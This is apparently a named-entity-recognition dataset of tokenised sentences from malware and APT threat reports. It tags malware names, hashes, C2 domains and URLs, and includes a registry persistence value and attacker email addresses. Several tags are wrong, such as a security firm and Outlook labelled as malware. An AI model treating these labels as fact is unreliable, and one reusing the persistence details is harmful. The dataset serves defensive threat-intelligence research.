obfuscated O
using O
Zendix O
Klass O
Master O
( O
ZKM O
) O
, O
a O
commercially-available O
Java O
obfuscator O
. O

And O
when O
specific O
malware O
sets O
are O
selectively O
deployed O
, O
that O
may O
tell O
us O
something O
about O
how O
efforts O
are O
divided O
. O

The O
parameters O
sent O
to O
the O
' O
ap.php O
' O
script O
are O
randomly O
generated O
on O
each O
hit O
, O
so O
the O
second O
stage O
payload O
gets O
encrypted O
differently O
each O
time O
. O

Tracing O
backwards O
up O
the O
stack O
, O
we O
follow O
the O
reference O
to O
EAX O
as O
the O
baton O
is O
passed O
from O
register O
to O
register O
. O

BRIEF O
DESCRIPTION O
ZxShell B-malware.backdoor
GetProcAddress O
implementation O
FUNCTION O
NAME O
ZxGetLibAndProcAddr O
CopyMemoryFromNewMsvcrt O
ZxShell B-malware.backdoor
memory O
copy O
routine O
ServiceExists O
ProcessScCommand O
AnalyseAndLoadPlugins O
DeleteAndLogPlugin O
KeyloggerThread O
GetIpListAndConnect O
BuildTargetIpListStruct O
DoHandshake O
GetLocalPcDescrStr O
MainConnectionIo O
ReceiveCommandData O
ProcessCommand O
OFFSET O
0x12CDA O
0x12C4C O
0x0A7C7 O
Get O
if O
a O
service O
is O
installed O
in O
the O
system O
or O
not O
0x0E3EF O
ZxShell B-malware.backdoor
' O
SC O
' O
command O
implementation O
0x0127B7 O
Parse O
the O
installed O
plugin O
list O
and O
load O
each O
one O
of O
them O
0x012597 O
Delete O
a O
corrupted O
plugin O
and O
log O
the O
problem O
ZxShell B-malware.backdoor
keylogger O
implementation O
0x0D591 O
Analyse O
the O
IP O
list O
inside O
the O
ZxShell B-malware.backdoor
PE O
and O
tries O
to O
connect O
0x011496 O
Build O
remote O
server O
Ip O
list O
structure O
Perform O
initial O
connection O
handshake O
Build O
a O
string O
containing O
the O
target O
workstation O
data O
ZxShell B-malware.backdoor
main O
connection O
I/O O
routine O
Receive O
each O
byte O
from O
the O
socket O
until O
a O
newline O
char O
Main O
ZxShell B-malware.backdoor
command O
processing O
routine O
0x11419 O
0xB8E8 O
0x0B627 O
0x1126C O
0x016DF O
0x10C2B O

hxxp://servicesprocessing[.]com/naspckn/plugins/wsutils.exe B-url.unknown
hxxp://servicesprocessing[.]com/naspckn/plugins/shlwapi.exe B-url.unknown
hxxp://servicesprocessing[.]com/panomasi/plugins/shlwapi.exe B-url.unknown
: O
md5 O
eeaf96b1988c7016780c0d91ce2451c8 B-hash

The O
malware O
then O
collects O
system O
information O
like O
the O
c O
omputer O
name O
, O
operating O
system O
caption O
, O
IP O
address O
of O
the O
infected O
system O
, O
product O
version O
of O
the O
executable O
file O
and O
sends O
it O
to O
the O
C2 O
server O
along O
with O
the O
generated O
user O
name O
and O
password O
using O
a O
POST O
request O
to O
postdata.php O
. O

Our O
colleagues O
at O
ESET O
have O
published O
their O
own O
excellent O
analysis O
suggesting O
a O
possible O
link O
between O
ExPetr/Petya O
and O
TeleBots O
( O
BlackEnergy O
) O
. O

Key O
: O
Value O
name O
: O
AdobePlayer O
Value O
data O
: O
regsvr32 O
/s O
' O
C O
: O
\Documents O
and O
Settings\ O
[ O
USER_NAME O
] O
\Application O
Data\adobe\adobe.dat O
' O
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run O

The O
zip O
file O
extracts O
to O
a O
Windows O
Shortcut O
file O
with O
the O
same O
name O
and O
a O
.lnk O
extension O
. O

The O
malware O
has O
several O
modules O
, O
some O
of O
which O
are O
: O
Taking O
a O
screenshot O
of O
the O
infected O
machine O
and O
sending O
it O
to O
the O
C O
& O
C O
server O
. O

The O
title O
of O
the O
email O
field O
is O
' O
FPAP O
Email O
' O
, O
' O
FPAP O
' O
could O
stand O
for O
' O
Family O
Planning O
Association O
of O
Pakistan O
. O
' O

Value O

It O
's O
common O
to O
observe O
attacks O
pulled O
off O
successfully O
without O
any O
particular O
sophistication O
in O
place O
, O
including O
the O
incidents O
described O
in O
this O
post O
. O

To O
achieve O
that O
, O
the O
SWIFT O
messages O
the O
malware O
locates O
are O
read O
, O
parsed O
, O
and O
converted O
into O
PRT O
files O
that O
describe O
the O
text O
in O
Printer O
Command O
Language O
( O
PCL O
) O
. O

In O
the O
realm O
of O
quantum O
mechanics O
, O
entanglement O
is O
a O
peculiar O
phenomenon O
in O
which O
a O
. O

Description O

These O
targets O
include O
foreign O
affairs O
government O
organizations O
both O
localized O
and O
abroad O
, O
and O
defense O
organizations O
' O
presence O
localized O
, O
located O
in O
Europe O
and O
also O
located O
in O
Afghanistan O
. O

As O
we O
can O
see O
, O
the O
attack O
surface O
covered O
by O
the O
hacker O
group O
is O
incredibly O
wide O
: O
there O
are O
two O
different O
C2Cs O
in O
Europe O
and O
another O
one O
in O
China O
to O
mislead O
the O
analysis O
and O
this O
create O
confusion O
during O
the O
reconstruction O
of O
the O
complete O
cyber-attack O
. O

The O
profile O
has O
also O
been O
disabled O
in O
the O
months O
after O
we O
published O
the O
first O
report O
. O

Module O
Purpose O

Due O
to O
patches O
and O
other O
protective O
mechanism O
, O
N-day B-malware.unknown
exploits O
will O
frequently O
cause O
a O
prompt O
, O
warning O
, O
popup O
or O
flat O
out O
will O
not O
work O
. O

On O
the O
right O
side O
of O
the O
diagram O
are O
files O
used O
in O
two O
other O
campaigns O
using O
the O
ArcomRAT B-malware.backdoor
8 O
and O
DarkComet B-malware.backdoor
6,7 O
, O
The O
fact O
that O
they O
share O
the O
same O
command-and-control O
infrastructure O
as O
the O
UnrecomRat B-malware.backdoor
campaign O
make O
this O
central O
node O
all O
the O
more O
interesting O
. O

When O
the O
victim O
executes O
the O
Windows O
shortcut O
, O
they O
are O
directed O
to O
one O
of O
several O
malicious O
links O
depending O
on O
the O
zipfile O
that O
they O
were O
sent O
. O

15nXl9eZ15PXlCAg157XmdeV15fXk9eq O

By O
using O
and O
f O
urther O
navigating O
this O
website O
you O
accept O
that O
some O
of O
your O
browsing O
activity O
can O
be O
recorded O
in O
cookies O
. O

This O
is O
a O
simple O
way O
to O
track O
the O
activity O
of O
these O
actors O
by O
using O
both O
passive O
DNS O
data O
and O
configuration O
information O
extracted O
from O
XtremeRAT B-malware.backdoor
. O

The O
remainder O
of O
the O
code O
, O
other O
than O
the O
borrowed O
MBR O
, O
was O
implemented O
by O
the O
authors O
themselves O
. O

A5DE87646EE943CD1F448A67FDBE2817 B-hash
hint.zapto.org B-url.cncsvr

AppManifest.xaml O
Shell_siver.dll O
System.Xml.Linq.dll O

Secondly O
we O
conduct O
a O
comparative O
study O
of O
Dark O
Seoul O
by O
looking O
at O
prior O
cyber O
attacks O
, O
namely O
Stuxnet B-malware.backdoor
, O
10 O
Days O
of O
Rain O
, O
and O
the O
SK O
Communications O
breach O
. O

Word O
document O
, O
contained O
in O
SFX O
RAR O
file O
15FC009D9CAAA8F11D6C3DA2B69EA06E B-hash

After O
checking O
to O
make O
sure O
neither O
the O
source O
nor O
key O
strings O
are O
empty O
, O
the O
function O
gets O
down O
to O
business O
. O

Injected O

It O
is O
easy O
to O
expect O
deliberate O
changes O
within O
this O
group O
in O
2018 O
, O
with O
even O
more O
.Net O
, O
Delphi O
, O
and O
powershell O
ports O
of O
various O
tools O
appearing O
at O
Sofacy O
targets O
throughout O
the O
year O
. O

The O
code O
of O
mrxcls O
and O
jmidebs O
drivers O
is O
largely O
similar O
. O

McAfee O
Product O
Coverage O
* O

GNU O
HTTPTunnel O
: O
An O
open-source O
tool O
that O
can O
create O
a O
bidirectional O
HTTP O
tunnel O
on O
Linux O
computers O
, O
potentially O
allowing O
communication O
beyond O
a O
restrictive O
 rewall O
. O

This O
write-up O
provides O
initial O
disclosure O
of O
a O
portion O
of O
the O
malware O
and O
infrastructure O
used O
by O
the O
Ghost O
Dragon O
group O
and O
covers O
the O
new O
security O
mechanisms O
in O
detail O
, O
as O
well O
as O
revealing O
how O
researchers O
were O
able O
to O
communicate O
with O
the O
custom O
implant O
by O
rebuilding O
and O
compiling O
a O
customized O
Gh0st B-malware.backdoor
RAT I-malware.backdoor
controller O
. O

Figure O
27 O
. O

The O
information O
contained O
in O
this O
document O
has O
been O
prepared O
as O
a O
matter O
of O
interest O
and O
for O
information O
purposes O
only O
, O
and O
does O
not O
constitute O
professional O
advice O
. O

Volexity B-malware.backdoor
has O
yet O
to O
actually O
see O
the O
contents O
of O
the O
file O
o.js O
, O
as O
the O
websites O
has O
continuously O
returned O
HTTP O
403 O
responses O
each O
time O
it O
was O
requested O
. O

The O
executable O
file O
compressor O
UPX O
unpacks O
the O
binary O
to O
reveal O
details O
hidden O
by O
the O
packer O
. O

Secure O
logs O
, O
potentially O
in O
a O
centralized O
location O
, O
and O
protect O
them O
from O
modification O
. O

JRat B-malware.backdoor
is O
a O
commercially O
available O
remote O
access O
tool O
( O
RAT B-malware.unknown
) O
, O
written O
in O
Java O
. O

When O
opened O
, O
the O
client O
displays O
example O
shell O
entries O
that O
point O
to O
www.maicaidao.com B-url.unknown
, O
which O
originally O
hosted O
components O
of O
the O
Web B-malware.ransom
shell O
. O

This O
download O
link O
( O
hxxp://techto-earth[.]com/eastwing/download/sppsvc.exe B-url.cncsvr
) O
was O
at O
the O
point O
of O
writing O
live O
, O
and O
the O
downloaded O
executable O
( O
md5 O
c571b77469ad3c5ef336860605ee85c6 B-hash
) O
was O
verified O
as O
a O
PyInstaller-based O
malware O
. O

An O
ironic O
, O
yet O
noteworthy O
observation O
is O
that O
the O
Tranchulas O
website O
boasts O
Telenor O
as O
a O
client O
. O

GravityRAT B-malware.drop
has O
been O
under O
ongoing O
development O
for O
at O
least O
18 O
months O
, O
during O
which O
the O
developer O
has O
implemented O
new O
features O
. O

We O
have O
uncovered O
two O
distinct O
attack O
campaigns O
originating O
from O
different O
geographic O
regions O
in O
China O
using O
similar O
tools O
, O
techniques O
and O
procedures O
( O
TTPs O
) O
. O

This O
is O
a O
typical O
technique O
used O
by O
Meterpreter O
stagers O
. O

In O
case O
where O
it O
detects O
anti-virus O
software O
, O
Asruex B-malware.drop
generates O
a O
DLL O
file O
and O
loads O
it O
to O
itself O
( O
but O
does O
not O
perform O
DLL O
injection O
) O
. O

The O
Iranian O
attacks O
in O
2012 O
and O
2014 O
were O
in O
contrast O
to O
the O
relatively O
slow O
and O
methodical O
work O
of O
APT O
33 O
, O
APT O
34 O
, O
and O
APT O
35 O
, O
developing O
custom O
malware O
, O
targeting O
data O
exfiltration O
from O
strategic O
intelligence O
targets O
such O
as O
U.S. O
military O
contractors O
, O
Middle O
East O
energy O
companies O
, O
and O
university O
research O
networks O
. O

We O
believe O
that O
this O
indicates O
that O
Gamma O
either O
independently O
changed O
the O
FinSpy B-malware.backdoor
protocol I-malware.backdoor
, O
or O
was O
able O
to O
determine O
key O
elements O
of O
our O
fingerprint O
, O
although O
it O
has O
never O
been O
publicly O
revealed O
. O

DWORD O
dwCommandType O
; O
DWORD O
dwLastError O
; O

beautifl@mail.bg O
ennemyman@mail.bg O
fasionman@mail.bg O
happylove@mail.bg O
lovest000@mail.bg O
monneyman@mail.bg O
sportsman@mail.bg O
veryhappy@mail.bg O

page O
| O
3 O

Although O
the O
actual O
VBS O
script O
changed O
from O
sample O
to O
sample O
, O
with O
different O
levels O
of O
obfuscation O
and O
different O
ways O
of O
invoking O
the O
next O
stage O
of O
process O
tree O
, O
its O
final O
purpose O
remained O
same O
: O
invoking O
PowerShell O
to O
decode O
the O
Base64 O
encoded O
PowerShell O
command O
in O
the O
INI O
file O
that O
was O
dropped O
earlier O
by O
the O
macro O
, O
and O
executing O
it O
. O

Haroon­ur­Rashid/Administrator O

Gen.3 O
Trojan-FH-DR O
! O
75D3D1F23628 O
Trojan.FHDR!tr O
Trojan-FHDR O
! O

The O
trojan O
attempts O
to O
exploit O
a O
vulnerability O
– O
CVE-2015-2426 O
in O
the O
OpenType O
manager O
module O
( O
ATMFD.dll O
) O
– O
which O
was O
patched O
by O
Microsoft O
in O
MS15-078 O
. O

It O
adds O
the O
SeLoadDriver O
privilege O
to O
its O
access O
token O
and O
proceeds O
to O
install O
the O
driver O
as O
a O
fake O
disk O
filter O
driver O
. O

A O
fake O
' O
svchost.exe B-malware.drop
' O
is O
installed O
in O
the O
victim O
's O
Application O
Data O
directory O
. O

When O
scada.exe B-malware.unknown
executes O
, O
it O
scans O
drives O
attached O
to O
the O
system O
for O
filenames O
ending O
in O
Step7ProSim.dll O
. O

The O
Ham B-malware.backdoor
Backdoor I-malware.backdoor

The O
obfuscation O
is O
based O
on O
pairs O
of O
complementary O
conditional O
jump O
instructions O
. O

Legitimate O
versions O
of O
the O
Freegate B-malware.infosteal
software O
are O
available O
for O
download O
on O
its O
website O
. O

Hussarini B-malware.backdoor
protocol O
The O
initial O
data O
it O
sends O
contains O
the O
generated O
ServerID O
, O
the O
size O
, O
and O
the O
checksum O
of O
the O
message O
. O

We O
can O
notice O
only O
two O
changes O
: O
The O
author O
patched O
several O
bugs O
; O
Four O
new O
exports O
appear O
: O
DllCanUnLoadNow O
( O
) O
, O
DllGetClassObject O
( O
) O
, O
DllRegisterServer O
( O
) O
, O
DllUnregisterServer O
( O
) O
. O

Figure O
5 O

If O
Asruex B-malware.drop
detects O
itself O
being O
operated O
in O
an O
environment O
under O
any O
of O
the O
following O
conditions O
( O
Table O
A-1 O
to O
A-6 O
) O
, O
it O
recognises O
that O
it O
is O
an O
analysis O
environment O
and O
stops O
running O
. O

Command O
' O
exeu O
' O
- O
process O
creation O
in O
a O
domain O
environment O

The O
Moafee B-malware.infosteal
campaign O
targets O
government O
and O
military O
organizations O
in O
countries O
with O
national O
interests O
in O
the O
South O
China O
Sea O
. O

Instead O
, O
it O
will O
proceed O
into O
setting O
result O
to O
0 O
( O
success O
) O
. O

Oldest O
known O
CozyDuke B-malware.drop
main O
module O

Also O
common O
among O
all O
of O
the O
families O
seems O
to O
be O
to O
hold O
system O
specific O
configuration O
data O
in O
memory O
at O
runtime O
, O
although O
this O
holds O
true O
for O
a O
lot O
of O
malware O
. O

AMP O
Threat O
Grid O
helps O
identify O
malicious O
binaries O
and O
build O
protection O
into O
all O
Cisco O
Security O
products O
. O

CVE­2010­3333 O

16 O

If O
the O
user O
clicks O
the O
OK O
button O
, O
the O
user O
is O
directed O
to O
a O
page O
requesting O
their O
name O
and O
national O
identification O
number O
. O

The O
dropped O
DLL O
is O
loaded O
into O
its O
own O
svchost.exe O
process O
. O

There O
are O
a O
lot O
of O
malicious O
programs O
involved O
in O
this O
campaign O
but O
, O
strangely O
, O
they O
each O
implement O
a O
single O
spying O
function O
. O

Pour O
plus O
d'informations O
sur O
l'actualité O
virale O
: O
http://www.securelist.com B-url.normal

The O
DownExecute B-malware.infosteal
malware O
is O
used O
as O
a O
way O
for O
the O
attackers O
to O
gain O
an O
initial O
foothold O
on O
the O
victim O
machine O
. O

The O
dropper O
name O
always O
matched O
the O
promised O
content O
of O
the O
spear O
phishing O
email O
. O

Upon O
obtaining O
the O
files O
on O
the O
FTP O
server O
, O
an O
older O
Gh0st B-malware.backdoor
RAT I-malware.backdoor
variant O
was O
obtained O
with O
the O
file O
name O
' O
operas.exe O
' O
. O

THURSD O
AY O
, O
J O
U O
LY O
1 O
2 O
, O
2018 O

Below O
screen O
shots O
show O
the O
code O
that O
collects O
the O
system O
information O
and O
the O
data O
that O
is O
sent O
to O
the O
attacker O
. O

T O
imber O
sales O
, O
construction O
T O
ennis O
club O
website O
Online O
store O
for O
farmers O
Online O
store O
of O
massage O
equipment O
Online O
clothes O
store O
Website O
development O
and O
promotion O
Online O
air O
conditioner O
store O
Analytical O
company O
Web O
server O
with O
many O
domains O
Web O
server O
with O
many O
domains O
Unknown O
server O
Flight O
tracker O

All O
the O
technical O
details O
point O
to O
an O
actor O
based O
in O
the O
same O
country O
as O
the O
victims O
: O
India O
. O

8 O
. O

is O
derived O
from O
the O
class O
meaning O
that O
the O
processing O
of O
commands O
should O
be O
contained O
within O
the O
PCC_FILE O
: O
:ProcessPacket O
member O
function O
with O
some O
additional O
processing O
done O
in O
the O
PCC_FILE O
: O
:ReadWaitingData O
member O
function O
. O

Similar O
to O
the O
Spanish O
network O
interactions O
, O
very O
large O
data O
volumes O
were O
exchanged O
between O
the O
two O
networks O
, O
denoting O
strong O
interest O
. O

Figure O
3 O
depicts O
the O
macro O
embedded O
within O
the O
XLSM O
file O
( O
MD5 O
: O
38125a991efc6ab02f7134db0ebe21b6 B-hash
) O
. O

Turla O
Carbon B-malware.backdoor
Pfinet O
backdoors O

The O
DNS O
queries O
are O
constructed O
from O
the O
following O
sections O
: O
1 O
. O

Specifically O
, O
Israel O
, O
Saudi O
Arabia O
, O
United O
States O
, O
and O
Iraq O
have O
been O
frequent O
targets O
of O
Iranian-funded O
military O
actions O
, O
most O
recently O
through O
Houthi O
rebels O
in O
Yemen O
, O
and O
Hezbollah O
everywhere O
else O
. O

Trend O
Micro O
. O

Terminate O
the O
current O
network O
connection O
between O
the O
client O
and O
the O
server O
variant O
. O

The O
first O
stage O
shellcode O
searches O
for O
the O
marker O
' O
GfCv O
' O
then O
checks O
the O
next O
four O
bytes O
are O
' O
EF O
FE O
EC O
CE O
' O
in O
the O
document O
then O
decodes O
the O
second O
stage O
shellcode O
using O
the O
four-byte O
XOR O
key O
' O
0x29F7C592 O
' O
. O

reports-pdf.jar B-malware.infosteal

Table O
3 O
shows O
the O
time O
stamps O
pulled O
from O
the O
MFT O
for O
our O
Web B-malware.ransom
shell O
file O
before O
and O
after O
the O
time O
stamps O
were O
modified O
. O

At O
the O
end O
of O
the O
exploitation O
chain O
, O
the O
server O
sends O
a O
legitimate O
PDF O
file O
to O
user O
– O
' O
china.pdf O
' O
. O

ATD O
is O
an O
alliance O
of O
people O
and O
organizations O
dedicated O
to O
democracy O
and O
universal O
suffrage O
in O
Hong O
Kong O
. O

The O
attacker O
uses O
this O
initial O
information O
as O
a O
fi O
ngerprint O
of O
the O
system O
, O
which O
proves O
extremely O
useful O
in O
determining O
the O
importance O
of O
the O
infected O
target O
and O
its O
potential O
role O
on O
the O
network O
. O

For O
detailed O
information O
tying O
Operation O
Cobalt O
Kitty O
to O
the O
OceanLotus O
Group O
, O
please O
see O
our O
Attacker O
's O
Arsenal O
and O
Threat O
Actor O
Profile O
sections O
. O

This O
could O
be O
because O
our O
boot O
sector O
was O
at O
sector O
56 O
and O
not O
63 O
, O
or O
because O
the O
multiple O
partitions O
clash O
when O
trying O
to O
add O
them O
in O
. O

Likewise O
, O
when O
a O
DarkComet B-malware.backdoor
C O
& O
C O
issues O
attacks O
command O
, O
the O
encrypted O
traffic O
on O
the O
wire O
looks O
like O
these O
examples O
: O

Those O
decoy O
documents O
are O
written O
in O
Japanese O
, O
but O
some O
are O
also O
in O
Chinese O
, O
which O
implies O
that O
the O
target O
for O
this O
attack O
is O
not O
limited O
to O
Japanese O
organisations O
. O

As O
usually O
happens O
with O
these O
big O
operations O
, O
considering O
the O
huge O
investment O
and O
number O
of O
resources O
behind O
it O
, O
they O
do O
n't O
just O
' O
go O
away O
' O
forever O
. O

Files O
are O
uploaded O
on-demand O
. O

We O
believe O
Duqu B-malware.infosteal
and O
Stuxnet B-malware.backdoor
were O
simultaneous O
projects O
supported O
by O
the O
same O
team O
of O
developers O
. O

The O
first O
code O
block O
in O
the O
above O
IDA O
listing O
chooses O
which O
element O
of O
stable_var_41C O
should O
be O
swapped O
with O
the O
element O
. O

If O
the O
first O
source O
byte O
in O
the O
pair O
has O
value O
0x39 O
or O
less O
, O
the O
bot O
will O
subtract O
0x30 O
from O
it O
and O
save O
the O
result O
to O
the O
current O
index O
within O
the O
output O
buffer O
: O

To O
defeat O
DbgBreakPoint O
based O
debuggers O
, O
the O
malware O
finds O
the O
address O
of O
DbgBreakPoint O
, O
makes O
the O
page O
EXECUTE_READWRITE O
and O
writes O
a O
NOP O
on O
the O
entry O
point O
of O
DbgBreakPoint O
. O

This O
adds O
an O
interesting O
dimension O
to O
the O
story O
. O

Just O
after O
a O
few O
IDAPython O
scripts O
that O
retrieve O
all O
possible O
encoded O
strings O
and O
automatically O
generates O
the O
assembly O
code O
that O
calls O
, O
we O
can O
come O
up O
with O
a O
new O
IDA O
listing O
that O
shows O
the O
decoded O
string O
as O
the O
comment O
. O

7c52c340ec5c6f57ef2fd174e6490433 O
- O
adobe_flash_player.exe O
030f5fdb78bfc1ce7b459d3cc2cf1877 O
- O
Shockwave_Flash_Player.exe O

Point O
B. O
represents O
the O
initial O
svchost.exe O
startup O
, O
which O
is O
loading O
the O
malware O
payload O
. O

T O
he O
sites O
and O
servers O
on O
this O
list O
do O
not O
seem O
to O
have O
anything O
in O
common O
. O

Packet O
: O
:getCommand O
) O
: O

msfte.dll O

( O
d3e0b129bad263e6c0dcb1a9da55978b B-hash
) O
An O
analysis O
of O
the O
malware O
and O
other O
parts O
of O
the O
campaign O
was O
published O
by O
Mcafee O
in O
on O
November O
11 O
, O
2016 O
. O

The O
encrypted O
confi O
gurations O
previously O
located O
will O
be O
decrypted O
using O
AES O
. O

testing O

1302_E63C5C8F O
- O
> O
is O
the O
botID_volume-serial-number O
Process O
Hacker O
[ O
WIN-T9UN4HIIHEC\Administrator O
] O
+ O
- O
> O
Reports O
open O
window O
, O
In O
my O
case O
I O
was O
using O
a O
tool O
called O
Process O
Hacker O
, O
The O
information O
on O
the O
open O
window O
lets O
the O
attacker O
know O
what O
tools O
are O
running O
on O
the O
system O
or O
if O
analysis O
tools O
are O
used O
to O
inspect O
the O
malware O
. O

Word.exe O
, O
an O
XtremeRat B-malware.backdoor
backdoor O
executable O
2.ico O
, O
an O
icon O
file O
barrage.doc O
, O
an O
innocent O
document O
containing O
pictures O
( O
above O
) O

The O
server O
has O
been O
detected O
in O
every O
round O
of O
scanning O
, O
and O
remains O
operational O
at O
the O
time O
of O
this O
writing O
. O

Abilities O
include O
uploading O
and O
downloading O
files O
to O
and O
from O
the O
target O
, O
using O
the O
file-retrieval O
tool O
Wget O
to O
download O
files O
from O
the O
Web O
to O
the O
target O
. O

However O
, O
in O
early O
September O
the O
JavaScript O
was O
pre-pended O
to O
the O
file O
http://parts.nikkei.com/parts/SC/s_cDS.js B-url.unknown
as I-url.unknown
seen O
in O
the O
screen O
shot O
below O
. O

This O
PE O
sample O
was O
firstly O
uploaded O
to O
Virustotal O
on O
May O
2 O
, O
2015 O
: O

inject O
Interval O
delete_cmd O
broadcast_cmd O
: O

The O
steganography O
tool O
works O
by O
embedding O
the O
bytes O
of O
a O
script O
into O
the O
pixels O
of O
the O
image O
 le O
, O
giving O
the O
attacker O
the O
ability O
to O
hide O
malicious O
PowerShell O
code O
in O
a O
visible O
image O
on O
a O
remote O
server O
. O

0x10 O
indicating O
an O
error O
and O
terminating O
the O
remote O
shell O
session O
. O

World O
Anti-Doping O
Agency O
( O
WADA O
) O

Those O
who O
argue O
loudest O
against O
such O
assertions O
cite O
Sofacy O
's O
prolific O
criminal O
profit O
as O
evidence O
that O
they O
are O
most O
likely O
not O
agents O
of O
the O
Federal O
Security O
Service O
( O
FSB O
) O
; O
while O
others O
suppose O
that O
the O
crimes O
committed O
bearing O
Sofacy O
's O
unique O
signatures O
is O
a O
perfect O
cover O
behind O
which O
the O
Russian O
Government O
prefers O
to O
remain O
. O

Lastly O
, O
we O
discovered O
encrypted O
data O
dumps O
from O
yet O
more O
campaigns O
, O
which O
we O
were O
unable O
at O
the O
time O
of O
this O
report O
. O

In O
one O
cluster O
of O
ScanBox B-malware.infosteal
activity O
, O
instead O
of O
checking O
for O
specific O
files O
as O
per O
the O
method O
above O
, O
the O
attackers O
have O
implemented O
a O
different O
method O
of O
tracking O
files O
and O
drives O
present O
on O
the O
victim O
machine O
. O

Like O
the O
Trojan O
from O
the O
first O
campaign O
, O
this O
sample O
checks O
if O
the O
foreground O
window O
's O
title O
contains O
names O
of O
Brazilian O
banks O
and O
digital O
coins O
by O
looking O
for O
hardcoded O
strings O
. O

Not O
only O
are O
its O
obfuscation O
techniques O
becoming O
stronger O
, O
but O
its O
anti-detection O
technology O
list O
is O
growing O
. O

Data O
Source= O
- O
the O
code O
will O
assume O
that O
the O
unlabeled O
textbox2 O
contains O
a O
valid O
SQL O
query O
and O
will O
execute O
it O
and O
display O
the O
results O
. O

Backdoor B-malware.backdoor
command O
xC0 B-malware.backdoor
: O
Get O
CPU O
info O
, O
Windows O
and O
System32 O
folder O
, O
hostname O
, O
user O
name O
and O
clipboard O
content O
Backdoor B-malware.backdoor
command O
x82 B-malware.backdoor
: O
Get O
drive O
listings O
and O
types O

The O
DLLs O
are O
extracted O
into O
the O
app O
data O
folder O
: O
% O
USERPROFILE O
% O
\AppData\Roaming\Microsoft\VSA\.nlp O
– O
Stage O
1 O
% O
USERPROFILE O
% O
\AppData\Roaming\Microsoft\Protect\.nlp.hist O
– O
Stage O
2 O
The O
first O
stage O
is O
executed O
and O
the O
DLL O
is O
loaded O
using O
Reflective O
DLL O
Injection O
. O

Main O
module O
Encryption O
Registry O
Value O
Device O
name O

The O
downloaded O
file O
is O
then O
executed O
by O
the O
malware O
as O
shown O
in O
the O
below O
screen O
shot O
. O

Xwizard.exe O
KB12345678.exe O
SndVolSSO.exe O
88d35332ad30964af4f55f1e44 B-hash
c951b15a109832 I-hash
d48602c3c73e8e33162e8789 B-hash
1fb36a35f621b09b I-hash
tonholding(.)com B-url.cncsvr
nsquery(.)net B-url.cncsvr
1fef52800fa9b752b98d3cbb8ff B-hash
f0c44046526aa I-hash
tonholding(.)com B-url.cncsvr
nsquery(.)net B-url.cncsvr

Moreover O
, O
the O
developers O
changed O
the O
compiler O
; O
they O
switched O
from O
Visual O
Studio O
6.0 O
to O
Visual O
Studio O
9.0/10.0 O
, O
which O
is O
a O
strong O
indicator O
for O
the O
huge O
differences.Version O
3.00 O
is O
what O
the O
G O
DATA O
SecurityLabs O
experts O
call O
ComRAT B-malware.backdoor
. O

It O
is O
hard O
to O
define O
for O
sure O
, O
, O
but O
to O
our O
knowledge O
, O
the O
total O
of O
the O
attacker O
's O
pastes O
received O
around O
14K O
views O
, O
~11K O
for O
dropped O
payload O
URL O
and O
~2k O
for O
the O
android O
miner O
paste O
. O

73f493f6a2b0da23a79b50765c164e88 B-hash
f6fafb7c30b1114befc93f39d0698560 B-hash
eaa6e03d9dae356481215e3a9d2914dc B-hash
0 O
0824.1.doc O
File O
Name O
06da4eb2ab6412c0dc7f295920eb61c4 B-hash
53baedf3765e27fb465057c48387c9b6 B-hash
103 O
3 O
00a95fb30be2d6271c491545f6c6a707 B-hash
2014 O
09 O
17 O
Welcome O
Reception O
for O
Bob O
4ab6bf7e6796bb930be2dd0141128d06 B-hash
_Y103 O
( O
2 O
) O
_ O
and O
Jason_invitation.doc O
( O
0825 O
) O
.doc O
Exploit O

SHA-1 O
SHA-256 O
File O
Size O
374896a75493a406eb427f35eec86fe5 B-hash
7fbf5f83f34b8a3531fb1be7eca83167648e7b21 B-hash
1228e9066819f115e8b2a6c1b75352566a6a5dc002d9d36a8c5b47758c9f6a45 B-hash
294 O
KB O

This O
last O
DLL B-malware.unknown
seems O
to O
be O
completely O
unconnected O
with O
the O
previous O
samples O
, O
but O
further O
investigation O
leads O
us O
into O
believing O
that O
it O
was O
an O
additional O
component O
used O
by O
APT28 O
in O
this O
campaign O
to O
compromise O
the O
target O
system O
. O

Importance O

This O
file O
is O
part O
of O
the O
Microsoft O
Office O
suite O
and O
can O
be O
used O
to O
find O
keywords O
within O
Outlook O
data O
files O
. O

This O
functionality O
resembles O
a O
method O
described O
by O
SecurityExploded O
for O
' O
Recovering O
Passwords O
from O
Outlook B-malware.unknown
2002-2013 O
' O
. O

In O
order O
to O
track O
who O
opened O
the O
phishing O
emails O
, O
viewed O
the O
links O
, O
and O
downloaded O
the O
attachments O
in O
real-time O
, O
APT32 B-malware.infosteal
used O
cloud-based O
email O
analytics O
software O
designed O
for O
sales O
organizations O
. O

The O
servers O
operated O
in O
19 O
different O
countries O
. O

First O
of O
all O
, O
if O
they O
had O
been O
used O
in O
Stuxnet B-malware.backdoor
, O
they O
would O
have O
left O
a O
far O
bigger O
footprint O
than O
the O
individual O
cases O
we O
have O
detected O
. O

The O
real O
C2 O
server O
, O
103.236.150[.]14 B-ip.unknown
, O
is O
actually O
hardcoded O
( O
see O
Exhibit O
4 O
) O
. O

Figure O
5 O
A O
sample O
of O
the O
data O
that O
is O
encrypted O
and O
sent O
to O
the O
CnC O
server O
for O
version O
' O
p=2 O
' O
is O
seen O
in O
the O
memory O
dump O
shown O
in O
Figure O
6 O
. O

Targeting O
profiles O
, O
spearphish O
filenames O
, O
and O
lures O
carry O
thematic O
content O
related O
to O
visa O
applications O
and O
scanned O
images O
, O
border O
control O
administration O
, O
and O
various O
administrative O
notes O
. O

A O
large O
team O
of O
human O
analysts O
is O
also O
required O
to O
manually O
sort O
through O
captured O
data O
and O
process O
it O
manually O
and/or O
with O
Big O
Data-like O
analytics O
. O

Antivirus O
disablement O
: O
Malware O
attempts O
to O
disable O
Ahnlab O
and O
Hauri O
antivirus O
. O

Domain O
First O
Seen O
Last O
Seen O

' O
Russian O
Sports O
Minister O
Vitaly O
Mutko O
Denies O
Link O
to O
Wada O
Hackers O
. O
' O

EXITEWINDOWS O
calls O
ExitWindowsEx O
. O

The O
document O
is O
named O
to O
Nguyen O
Anh O
Tuan O
, O
which O
is O
presented O
as O
author O
of O
this O
crafted O
text O
. O

Further O
analysis O
of O
the O
street O
addresses O
enabled O
root9B O
to O
correlate O
the O
address O
and O
personas O
listed O
as O
registrants O
via O
public O
records O
, O
doing O
so O
showed O
that O
most O
of O
these O
addresses O
did O
not O
even O
exist O
, O
and O
the O
few O
addresses O
confirmed O
to O
physically O
exist O
did O
not O
have O
residents O
with O
the O
names O
listed O
. O

Clearly O
, O
english O
and O
